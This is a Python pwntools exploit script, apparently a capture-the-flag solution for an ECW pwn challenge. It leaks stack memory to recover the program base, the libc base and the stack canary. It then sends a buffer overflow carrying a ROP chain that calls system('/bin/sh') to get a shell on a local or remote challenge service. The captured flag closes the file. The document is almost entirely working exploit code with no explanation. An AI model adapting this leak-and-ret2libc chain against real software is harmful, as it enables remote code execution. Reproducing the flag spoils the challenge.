from pwn import *

CMDLINE = ["./vuln_patched"]

elf = ELF(CMDLINE[0], checksec=False)
libc = elf.libc

context.arch = "amd64"

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1234
    REMOTE_HOST = "challenges.challenge-ecw.eu" 
    REMOTE_PORT = 34461

    def __init__(self) -> None:
        if args.REMOTE:
            self.io = remote(self.REMOTE_HOST, self.REMOTE_PORT)
        elif args.LOCAL:
            self.io = remote(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            self.io = process(CMDLINE)
            if args.DBG:
                print(self.io.pid)
                pause()

    def input(self, buf: bytes):
        self.io.sendlineafter(b"inpt\n", b'i')
        self.io.sendline(buf)
    
    def output(self) -> bytes:
        self.io.sendlineafter(b"inpt\n", b'o')
        return self.io.recvuntil(b"plz ", drop=True)

    def loc_to_glob(self):
        self.io.sendlineafter(b"inpt\n", b'l')
    
    def glob_to_loc_min(self):
        self.io.sendlineafter(b"inpt\n", b'g')
    
    def glob_to_loc(self):
        self.io.sendlineafter(b"inpt\n", b'f')
    
    def quit(self):
        self.io.sendlineafter(b"inpt\n", b'q')

    def leak_stack(self, offset: int):
        self.input(b"A"*(offset-1))

        self.glob_to_loc_min()
        self.loc_to_glob()

        return self.output().split(b"A"*(offset-1) + b"\n")[1]

    def interactive(self):
        self.io.interactive()

    def close(self):
        self.io.close()

# handle SIGSEGV pass nostop noprint

io = Exploit()

elf_leak = u64(io.leak_stack(0x48).ljust(8, b'\0'))
elf.address = elf_leak - next(elf.search(b"some mot message"))

libc_leak = u64(io.leak_stack(0x58).ljust(8, b'\0'))
libc.address = libc_leak - libc.symbols["_IO_file_jumps"]

canary = u64((b"\x00" + io.leak_stack(0xe9)).ljust(8, b'\0'))

print("elf_base  @ %#x" % elf.address)
print("libc_base @ %#x" % libc.address)
print("canary    @ %#x" % canary)

pop_rdi = lambda x : p64(elf.address + 0x000000000000155b) + p64(x) # pop rdi ; ret
ret = p64(elf.address + 0x1016) # ret

rp = b''
rp += b'A'*0xf8
rp += p64(canary)
rp += b'B'*0x28
rp += pop_rdi(next(libc.search(b"/bin/sh")))
rp += ret
rp += p64(libc.symbols.system)

io.input(rp)

io.glob_to_loc()

io.quit()

io.interactive()
io.close()

# ECW{c-define-considered-harmful-f97f6c791eb8de51}